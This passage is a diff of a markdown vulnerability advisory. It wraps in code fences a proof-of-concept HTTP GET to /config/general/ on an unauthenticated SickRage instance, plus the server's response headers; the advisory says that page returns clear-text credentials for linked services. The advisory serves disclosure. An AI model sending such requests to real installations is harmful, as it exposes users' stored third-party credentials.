@@ -32,6 +32,8 @@ SickRage returns clear-text credentials for e.g. GitHub, AniDB, Kodi, Plex etc. 
 Prerequisite is that the user did not set a username and password for their SickRage installation. (not enforced, default)  
   
 HTTP request:  
+
+```html
 GET /config/general/ HTTP/1.1  
 Host: 192.168.1.13:8081  
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0  
@@ -42,9 +44,12 @@ Referer: http://192.168.1.13:8081/config/backuprestore/
 DNT: 1  
 Connection: close  
 Upgrade-Insecure-Requests: 1  
+```
   
   
 HTTP response:  
+
+```html
 HTTP/1.1 200 OK  
 Content-Length: 113397  
 Vary: Accept-Encoding  
@@ -52,6 +57,8 @@ Server: TornadoServer/4.5.1
 Etag: "e5c29fe99abcd01731bec1afec0e618195f1ae37"  
 Date: Fri, 02 Mar 2018 10:47:51 GMT  
 Content-Type: text/html; charset=UTF-8  
+```
+
   
 ```html
 <!DOCTYPE html>  
